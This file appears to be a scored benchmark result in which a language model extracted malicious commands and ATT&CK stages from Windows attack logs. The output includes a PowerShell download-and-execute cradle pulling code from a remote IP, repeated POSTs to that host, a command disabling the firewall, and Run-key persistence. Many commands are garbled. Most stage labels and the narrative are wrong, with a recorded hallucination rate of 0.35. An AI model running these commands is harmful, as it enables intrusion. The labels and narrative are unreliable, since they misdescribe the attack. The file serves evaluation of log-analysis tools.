@@ -1,0 +1,175 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1134.001 -TestNumbers 1\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe';Invoke-AtomicTest T1220  -TestNumbers 1\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest t1547.001 -TestNumbers 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"invoke-webrequest http://124.223.85.207:8082/test.hta -method post -usebasicparsing -contentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/http:/124.223.85.207:8082/T1218.005.hta -Method POST -UseBasicParsing\", ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082(Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/http:/124.223.85.207:8082/chromeRemoteServices.ps1 -Method Post -Body @{'User-Agent'='Mozilla/5.0'}'",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebResquest http://124.223.85.207:8082/http:/124.223.85.207:8082/chromeRemoteServices.ps1 -Method Post -Body @{'User-Agent'='Mozilla/5.0'}\", ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "windows calculator Calc.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "NETSH ADVFIREFALL SET ALLPROFILES STATE OFF",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "REG ADD localhost/HKEY_CURRENT_USER/SOFTWARE/MICROSOFT/WINDOWS/CURRENTVERSION/POLICIES/EXPLORER/RUN/V AtomicRedTeamm",
+        "stage": "Persistence"
+      },
+      {
+        "command": "CertUtil.exe -decode a.txt b.txt",
+        "stage": "Collection"
+      },
+      {
+        "command": "DEL b.txt",
+        "stage": "Collection"
+      },
+      {
+        "command": "Reg Delete HKEY_LOCAL_MACHINE/SOFTWARE/MicroSoft/windows NT/current version/image file execution option",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd /c start powershellexecutionpolicy bypass -c new-item -path env TEMP/T1059_003_note tx -value \\\"hello world\\\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "FOR /L %X IN(1,1,75) DO START WORDPAD.EXE /P $Env:TEMP/T1059_003_NOTE.TXT",
+        "stage": "Collection"
+      },
+      {
+        "command": "TASKKILL /IM WORDPAD.EXE /f",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "taskkill /f /pid wordpad.exe",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "Notepad.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "taskhostw.exe USER",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "php flags:0x0/state0:0xa2bee055/state1:0x41c64e6d",
+        "stage": "Initial Access"
+      }
+    ],
+    "narrative": "The attackers have successfully gained an initial access point through user interaction on a windows device using the Calculator application and Notepad. They proceeded to execute their own commands within PowerShell, utilizing various techniques such as downloading scripts from remote servers, manipulating registry keys, and creating temporary files, effectively elevating privileges and gathering information about the system. Throughout the intrusion, they maintained communication with their command server via HTTP requests, indicating a clear attempt to establish persistence and carry out further attacks.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 41477,
+      "completion_tokens": 1483,
+      "total_tokens": 42960,
+      "wall_clock_s": 27.372,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.06451612903225806,
+      "recall": 0.09090909090909091,
+      "f1": 0.07547169811320754,
+      "tp": 2,
+      "fp": 29,
+      "fn": 20
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 31,
+      "fn": 23,
+      "recall_partial": 0.06521739130434782
+    },
+    "hallucination_rate": 0.35294117647058826,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 41477,
+      "completion_tokens": 1483,
+      "total_tokens": 42960,
+      "wall_clock_s": 27.372,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
